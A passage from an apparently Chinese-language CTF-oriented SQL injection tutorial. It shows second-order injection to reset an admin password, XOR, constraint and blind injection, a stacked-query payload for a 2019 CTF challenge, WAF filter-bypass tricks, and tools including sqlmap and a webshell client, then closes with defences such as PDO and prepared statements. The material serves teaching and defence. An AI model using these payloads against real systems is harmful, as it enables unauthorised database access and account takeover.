PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">		$res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>我们可以看到，这里都对输入的数据用<code>mysql_escape_string</code>函数进行了特殊字符的转义，我们是没有办法直接执行恶意语句的。这时候我们就可以使用二次注入的方法。</p>
<p>我们创一个用户名为<code>admin&#39;#</code>的账号，密码随意，如123。而因为当这段数据被写进数据库的时候，里面添加的反斜杠是会被MySQL移除的，所以我们这局句恶意语句就被存到了数据库中。</p>
<p>然后我们登录这个用户并修改密码，这里<code>pass_change.php</code>中执行的语句为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;123&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>

<p>因为后面已经被我们注释掉了，所以密码错误并不影响我们执行语句，我们就成功在没有密码的情况下修改了admin用户的密码。</p>
<h3 id="http头部注入"><a href="#http头部注入" class="headerlink" title="http头部注入"></a>http头部注入</h3><p>很简单，就是当我们在表单提交的数据都没办法注入，而sql语句中出现了http头部别的项且可以被注入时，我们就使用工具抓包修改该项，在其中拼接恶意语句的方法，这里就不再赘述。</p>
<hr>
<p><strong>再之后的这些也算不上是方法，都是些可能会用到的小技巧或者小知识点，都总结到这里。</strong></p>
<h3 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h3><p>当union,and和注释符都被完全过滤掉时，我们可以考虑使用异或注入</p>
<p>异或是一种逻辑运算，当两个条件相同时返回假(0)，不同时返回真(1)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;运算规则：</span><br><span class="line">1^1&#x3D;0 0^0&#x3D;0 0^1&#x3D;1</span><br><span class="line">1^1^1&#x3D;1 1^1^0&#x3D;0</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27;^ascii(mid(database(),1,1)=98)</span><br></pre></td></tr></table></figure>

<p>我们可以在后面多加一个^0或1来判断是否出现了语法错误。改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</p>
<h3 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h3><p>约束攻击一般出现在当出现类似<code>like</code>子句这种需要对字符串进行比较的时候。它的攻击思路是这样的：</p>
<p>当SQL中处理字符串时，字符串末尾的空格符会被删除，比如“user”和“user    ”是等价的，查询两者返回的都是user的信息。如果题目中出现了像LIKE子句这类”字符串比较“操作的时候，SQL会使用空格来填充字符串，使得在比较之前让他们的长度保持一致，方便比较。而在<code>INSERT</code>查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。这就是约束攻击中的“约束”。比如说，某列的长度约束为5个字符，那么在插入字符串“password”时，实际上插入的是“passw”。这就是我们可以攻击的地方了。我们举个例子来进一步理解。</p>
<p>比如某网站的用户数据库中有该条：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----------+-------------+</span><br><span class="line">| username | password    |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| users    | 0asd2a413ad |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure>

<p>我们就可以注册一个用户名为“users                       1”，密码为1的用户。</p>
<p>接着后台执行<code>SELECT</code>语句，这时是不会限制我们的长度的，所以并没有重名。而在执行<code>INSERT</code>插入我们的新用户时，就会根据varchar(n)来限制字符串的最大长度，从而将后面的“1”截掉，我们就插入了名为“users”，密码为1的用户了。通过它可以登录上述users用户。</p>
<p>防御手段见6.5</p>
<h3 id="正则注入"><a href="#正则注入" class="headerlink" title="正则注入"></a>正则注入</h3><p>在盲注的时候，我们可以通过正则表达式匹配查询。如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and 1&#x3D;(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA&#x3D;&quot;blind_sqli&quot; AND table_name REGEXP &#39;^[a-n]&#39; LIMIT 0,1)</span><br><span class="line">&#x2F;&#x2F;判断第一个字符是否是a-n中的字符</span><br></pre></td></tr></table></figure>

<h3 id="order-by-大小比较盲注"><a href="#order-by-大小比较盲注" class="headerlink" title="order by 大小比较盲注"></a>order by 大小比较盲注</h3><p>当遇到的盲注题过滤了括号，且知道username和password的单独回显时，可考虑使用该方法</p>
<blockquote>
<p>reference：<a href="https://www.cnblogs.com/xishaonian/p/7703486.html">https://www.cnblogs.com/xishaonian/p/7703486.html</a></p>
</blockquote>
<p>上面链接中的文章讲得很明白，利用order by语句的排序功能来进行判断，若我们查询的数据值比我们判断的值小或等于，则limit语句将不会让其输出，因此我们即可通过<code>order by</code>来逐个猜解password。</p>
<h3 id="PDO下的SQL注入"><a href="#PDO下的SQL注入" class="headerlink" title="PDO下的SQL注入"></a>PDO下的SQL注入</h3><p>关于PDO防止SQL注入的内容见下6.4。</p>
<p>PDO在使用不当时，也有可能会出现SQL注入问题。</p>
<p>对于原理并没有完全理解，就不误导他人了，指路其他大佬写的深入探究。</p>
<blockquote>
<p>reference：<a href="https://xz.aliyun.com/t/3950">https://xz.aliyun.com/t/3950</a></p>
</blockquote>
<p>在使用PDO处理SQL注入安全时，尽量使用非模拟预处理，并且禁止多语句查询来防止堆叠注入即可避免该类注入。</p>
<h3 id="预编译注入"><a href="#预编译注入" class="headerlink" title="预编译注入"></a>预编译注入</h3><p>有些时候，在关键字被正则过滤时，我们可以采用预编译的方式构造SQL语句来完成注入。</p>
<p>预编译语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;定义预处理语句</span><br><span class="line">PREPARE stmt_name FROM preparable_stmt;</span><br><span class="line">&#x2F;&#x2F;执行预处理语句</span><br><span class="line">EXECUTE stmt_name [USING @var_name [, @var_name] ...];</span><br><span class="line">&#x2F;&#x2F;删除(释放)定义</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;</span><br></pre></td></tr></table></figure>

<p>举个题目的例子，强网杯2019的题目<code>supersqli</code>中，题目作出了该限制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);</span><br></pre></td></tr></table></figure>

<p>虽然我们可以利用堆叠注入查询表和列的信息，但在查询flag字段时我们必须得用到上述中的关键字了，于是我们可以使用预编译的方法来进行注入。见下payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;查询1919810931114514列中的flag字段，空格不可省略</span><br><span class="line">-1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; flag from &#96;1919810931114514&#96; &#39;);EXECUTE hacker;#</span><br></pre></td></tr></table></figure>





<hr>
<h2 id="常见过滤-拦截-转义及绕过"><a href="#常见过滤-拦截-转义及绕过" class="headerlink" title="常见过滤/拦截/转义及绕过"></a>常见过滤/拦截/转义及绕过</h2><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><ul>
<li><p>用括号嵌套</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username() <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">2</span>=<span class="number">2</span></span><br><span class="line">//可以写成</span><br><span class="line"><span class="keyword">select</span>(username())<span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span>(<span class="number">1</span>=<span class="number">1</span>)<span class="keyword">and</span>(<span class="number">2</span>=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>用+号替代</p>
</li>
<li><p>使用注释/**/替换</p>
</li>
<li><p>用<code>%09</code> <code>%0A</code> <code>%0B</code> <code>%0C</code> <code>%0D</code> <code>%A0</code> <code>%20</code>等部分不可见字符代替空格（Windows的解析机制无法使用特殊字符代替空格，需要Linux的服务器环境才行）</p>
</li>
</ul>
<h3 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h3><ul>
<li>order by 大小比较盲注（见上3.15）</li>
</ul>
<h3 id="关键字及字符"><a href="#关键字及字符" class="headerlink" title="关键字及字符"></a>关键字及字符</h3><ul>
<li><p>双写绕过、大小写绕过</p>
</li>
<li><p>使用注释符绕过（现在一般都不起作用了）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">U&#x2F;**&#x2F; NION &#x2F;**&#x2F; SE&#x2F;**&#x2F; LECT &#x2F;**&#x2F;user，pwd from user</span><br></pre></td></tr></table></figure>
</li>
<li><p>十六进制、ASCII、RLEncode、unicode等编码绕过，适用于许多时候特殊字符或关键字被过滤</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> a <span class="keyword">from</span> yz <span class="keyword">where</span> b=<span class="number">0x32</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> yz <span class="keyword">where</span> b=<span class="built_in">char</span>(<span class="number">0x32</span>);</span><br><span class="line"></span><br><span class="line">Test</span><br><span class="line">//等价于</span><br><span class="line">CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</span><br></pre></td></tr></table></figure>
</li>
<li><p>双重编码绕过</p>
</li>
<li><p>函数可以用等价函数代替来绕过</p>
</li>
</ul>
<h3 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h3><ul>
<li><p>在<code>substr()</code>和<code>mid()</code>中的逗号可以用<code>from for</code>代替</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">mid</span>(<span class="keyword">database</span>() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>join代替</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>     </span><br><span class="line">//等价于</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span>  ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B );</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于limit可以用offset绕过</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">3</span> <span class="keyword">offset</span> <span class="number">1</span></span><br><span class="line">//都表示取第<span class="number">2</span>，<span class="number">3</span>，<span class="number">4</span>三条数据</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><ul>
<li><p><code>like</code> 模糊匹配，或<code>rlike</code> 、<code>regexp</code>正则匹配</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ‘12345’ like ‘12%’</span><br><span class="line">&#x2F;&#x2F;返回ture</span><br><span class="line">select ‘123455’ regexp ‘^12’</span><br><span class="line">&#x2F;&#x2F;返回ture</span><br></pre></td></tr></table></figure>
</li>
<li><p>用<code>greatest</code>和<code>least</code>代替<code>&gt;</code>和<code>&lt;</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>))&gt;<span class="number">64</span></span><br><span class="line">//可以用下句代替</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">greatest</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)=<span class="number">64</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>用<code>between</code>代替</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select database() between 0x61 and 0x7a;</span><br><span class="line">select database() between ‘a’ and ‘z’;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><ul>
<li><code>and</code>  ==  <code>&amp;&amp;</code> </li>
<li><code>or</code>  ==  <code>||</code></li>
<li><code>not</code>  ==  <code>！</code></li>
</ul>
<h4 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h4><ul>
<li><code>&amp;</code>  按位与</li>
<li><code>| </code> 按位或</li>
<li><code>^</code>  按位异或</li>
<li><code>!</code>  取反</li>
<li><code>&lt;&lt;</code>  左移   <code>&gt;&gt; </code>右移</li>
</ul>
<h3 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h3><ul>
<li>宽字节注入（见上3.8）</li>
<li>用<code>%2527</code>绕过magic_quotes_gpc过滤，因为<code>%25</code>解码为<code>%</code>,拼接后是<code>%27</code>即引号。</li>
</ul>
<h3 id="数字或字母"><a href="#数字或字母" class="headerlink" title="数字或字母"></a>数字或字母</h3><blockquote>
<p>引自《Mysql注入进阶》 by  <a href="http://pipinstall.cn/" title="ttpfx">ttpfx</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">false或!pi()：0</span><br><span class="line">true或!!pi()：1</span><br><span class="line">true+true：2</span><br><span class="line">floor(pi())：3</span><br><span class="line">ceil(pi())：4</span><br><span class="line">floor(version())：5</span><br><span class="line">ceil(version())：6</span><br><span class="line">ceil(pi()+pi())：7</span><br><span class="line">floor(version()+pi())：8</span><br><span class="line">floor(pi()*pi())：9</span><br><span class="line">ceil(pi()*pi())：10</span><br><span class="line">ceil(pi()*pi())+true：11</span><br><span class="line">ceil(pi()+pi()+version())：12</span><br><span class="line">floor(pi()*pi()+pi())：13</span><br><span class="line">ceil(pi()*pi()+pi())：14</span><br><span class="line">ceil(pi()*pi()+version())：15</span><br><span class="line">floor(pi()*version())：16</span><br><span class="line">ceil(pi()*version())：17</span><br><span class="line">ceil(pi()*version())+true：18</span><br><span class="line">floor((pi()+pi())*pi())：19</span><br><span class="line">ceil((pi()+pi())*pi())：20</span><br><span class="line">ceil(ceil(pi())*version())：21</span><br><span class="line">ceil(pi()*ceil(pi()+pi()))：22</span><br><span class="line">ceil((pi()+ceil(pi()))*pi())：23</span><br><span class="line">ceil(pi())*ceil(version())：24</span><br><span class="line">floor(pi()*(version()+pi()))：25</span><br><span class="line">floor(version()*version())：26</span><br><span class="line">ceil(version()*version())：27</span><br><span class="line">ceil(pi()*pi()*pi()-pi())：28</span><br><span class="line">floor(pi()*pi()*floor(pi()))：29</span><br></pre></td></tr></table></figure>

<p>使用conv([0-9],10,36)可以表示0<del>9的数字，conv([10</del>35],10,36)可以表示a~z单个字母，conv([35+],10,36)可按照三十六进制转换</p>
<hr>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>许多工具可以帮助我们大大提高注入的效率，甚至可以自动注入，但我们也不能太过于依赖工具而自废武功，要明白注入的原理，合理利用工具。这里我们简单列举几个在sql注入时常用到的工具。</p>
<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><blockquote>
<p>sqlmap是一款自动化的 sql 注入工具,闻名程度匹敌几年前的啊 D，他的功能很多，比如判断是否可以注入，发现，然后利用漏洞，里面也包含了许多绕 waf 的脚本，不过近两年都绕不了了，在 18 年的时候还勉强可以绕过。他支持许多数据库：MySQL，Microsoft sql server，access，sqllite，Oracle，postgreSQL，IBM DB2，sybase，SAP maxdb。</p>
<p>sqlmap也是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令），它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令<strong>SQLmap命令选项被归类为目标（Target）选项、请求（Request）选项、优化、注入、检测、技巧（Techniques）、指纹、枚举等。</strong></p>
<p>sqlmap 有几种sql注入方式：布尔盲注，时间盲注，联合查询注入，报错注入，堆查询注入。</p>
<p>——引自 知乎用户 <strong>38.5</strong> 关于sqlmap的回答<a href="https://www.zhihu.com/question/55542962/answer/1195551571">《sqlmap使用教程》</a></p>
</blockquote>
<p>最常见的sql注入工具，用起来很方便。</p>
<blockquote>
<p>sqlmap安装：<a href="https://blog.csdn.net/baigoocn/article/details/51456721">https://blog.csdn.net/baigoocn/article/details/51456721</a></p>
</blockquote>
<h3 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h3><p>burpsuite是一个Web应用程序集成攻击平台，它包含了一系列burp工具，我们可以利用它来抓包并进行修改头部信息、爆破等操作。</p>
<p>不仅是sql注入，很多时候我们都用得到burpsuite，不过分为免费版和专业版，功能略有差异。</p>
<blockquote>
<p>burpsuite安装：<a href="https://blog.csdn.net/LUOBIKUN/article/details/87457545">https://blog.csdn.net/LUOBIKUN/article/details/87457545</a></p>
</blockquote>
<h3 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h3><p>蚁剑是一款web远程连接工具，我们可以利用它，通过向网页上传一句话木马文件来连接网站里的文件，从而获得甚至修改网站文件。它可以在我们文件读写(见3.6)时提供很大的方便。</p>
<blockquote>
<p>蚁剑安装：<a href="https://blog.csdn.net/qq_45951598/article/details/108585696?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-2.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2.control">https://blog.csdn.net/qq_45951598/article/details/108585696?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-2.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2.control</a></p>
</blockquote>
<h3 id="BBQSQL"><a href="#BBQSQL" class="headerlink" title="BBQSQL"></a>BBQSQL</h3><blockquote>
<p>SQL盲注可是一个痛苦的过程。当工具都正常工作时，它们表现得很好，但是当它们无效时，你必须自己编写一些自定义的东西，这个过程既费时又乏味。而这一款盲注工具BBQSQL可以帮助我们解决这些问题。</p>
<p>BBQSQL是一款用Python编写的SQL盲注框架。在攻击棘手的SQL注入漏洞时，它会显得非常有用。BBQSQL还是一款半自动工具，可以为不会发现SQL注入点的用户提供大量自定义功能。该工具可与数据库无关，并且用途极为广泛。它还具有非常直观的用户界面，使设置攻击变得更加容易。同时，它也实现了Python gevent，这些都使BBQSQL非常快。</p>
<p>——引自知乎用户 <strong>二向箔安全学院</strong> 的文章<a href="https://zhuanlan.zhihu.com/p/139737334">《最受欢迎的十款SQL注入工具》</a></p>
</blockquote>
<hr>
<h2 id="如何防止被注入"><a href="#如何防止被注入" class="headerlink" title="如何防止被注入"></a>如何防止被注入</h2><p>由上可知，SQL注入对我们的数据安全有很大的威胁，所以我们在学会注入之后，最终的目的是懂得如何<strong>防止SQL注入</strong>，从而保护我们和用户的数据。</p>
<p>如今SQL漏洞已经被人熟知且基本被全面防范，所以我们也可以通过学习他人对SQL注入的处理来学习如何防止被SQL注入攻击。</p>
<h3 id="过滤-拦截"><a href="#过滤-拦截" class="headerlink" title="过滤/拦截"></a>过滤/拦截</h3><p>使用<code>mysql_real_escape_string</code>、<code>addslashes()</code>等函数来对字符串进行过滤，或者使用正则表达式过滤传入的参数，从而防止SQL注入。</p>
<h3 id="黑-白名单"><a href="#黑-白名单" class="headerlink" title="黑/白名单"></a>黑/白名单</h3><p>使用黑/白名单来限制可以输入的参数，从而防止SQL注入。注意，在使用黑名单时，一定要将敏感字符过滤得足够严格，否则过滤了再多也是徒劳。</p>
<h3 id="用PreparedStatement代替Statement"><a href="#用PreparedStatement代替Statement" class="headerlink" title="用PreparedStatement代替Statement"></a>用<code>PreparedStatement</code>代替<code>Statement</code></h3><p>在Java中，我们可以通过使用<code>PreparedStatement</code>代替<code>Statement</code>来防止SQL注入，这是因为<code>PreparedStatement</code>是预编译的，而且<code>PreparedStatement</code>参数不是简单拼接生成SQL，而是先用<code>?</code>占位，之后再根据参数产生SQL的，用户无法改变SQL语句的结构。同时<code>PreparedStatement</code>的执行效率也会更高。</p>
<h3 id="PDO防止注入"><a href="#PDO防止注入" class="headerlink" title="PDO防止注入"></a>PDO防止注入</h3><blockquote>
<p>PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。</p>
<p>PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。</p>
<p>PDO随PHP5.1发行，在PHP5.0的PECL扩展中也可以使用，无法运行于之前的PHP版本。</p>
<p>PDO与mysqli曾经被建议用来取代原本PHP在用的mysql相关函数，基于数据库使用的安全性，因为后者欠缺对于SQL注入的防护。</p>
<p>——引自菜鸟教程</p>
</blockquote>
<p>使用PHP的PDO扩展的 prepare 方法，可以避免SQL注入风险。</p>
<p>使用PDO访问MySQL数据库时，真正的real prepared statements 默认情况下是不使用的。为了解决这个问题，必须先禁用 prepared statements的仿真效果。下面是使用PDO创建链接的例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$dbh &#x3D; new PDO(&#39;mysql:dbname&#x3D;dbtest;host&#x3D;127.0.0.1;charset&#x3D;utf8&#39;, &#39;user&#39;, &#39;pass&#39;);</span><br><span class="line">$dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);</span><br></pre></td></tr></table></figure>

<p>setAttribute（）这一行是强制性的，它会告诉 PDO 禁用模拟预处理语句，并使用 real parepared statements 。这可以确保SQL语句和相应的值在传递到mysql服务器之前是不会被PHP解析的（禁止了所有可能的恶意SQL注入攻击）。</p>
<blockquote>
<p>reference：<a href="https://www.cnblogs.com/zl0372/p/php_28.html">pdo如何防止 sql注入</a></p>
</blockquote>
<h3 id="防御约束攻击"><a href="#防御约束攻击" class="headerlink" title="防御约束攻击"></a>防御约束攻击</h3><ul>
<li>插入数据前先判断数据长度。</li>
<li>使用id字段作为判断用户的凭证。</li>
<li>给username字段添加unique属性。</li>
</ul>
]]></content>
      <categories>
        <category>sql</category>
      </categories>
  </entry>
</search>
